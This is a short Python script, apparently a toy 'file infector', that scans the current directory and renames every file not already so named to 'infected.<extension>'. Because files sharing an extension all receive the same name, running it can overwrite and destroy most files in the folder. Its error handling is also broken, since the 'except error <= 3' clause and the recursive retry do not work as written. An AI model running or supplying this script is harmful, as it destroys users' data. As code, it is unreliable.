from __future__ import print_function
import os, time

def search(path="."):
	normalFiles = set() # set of uninfected file names
	for filename in os.listdir(path): # gets a list of file names in a given path
		print (filename, end='')
		if filename.startswith("infected"):
			print (" infected")
		else:
			print (" not infected yet... Infecting...")
			normalFiles.add(filename)
	return normalFiles

def infect(filelist):
	error = 0
	print ("")
	for filename in filelist:
		print ("Infecting... " + filename)
		try:
			os.rename(filename, "infected." + str(filename.split(".")[-1]))
		except error <= 3:
			print ("Infect failed... Trying again...")
			infect(search())
			error += 1

filelist = search()

print (filelist)

infect(filelist)
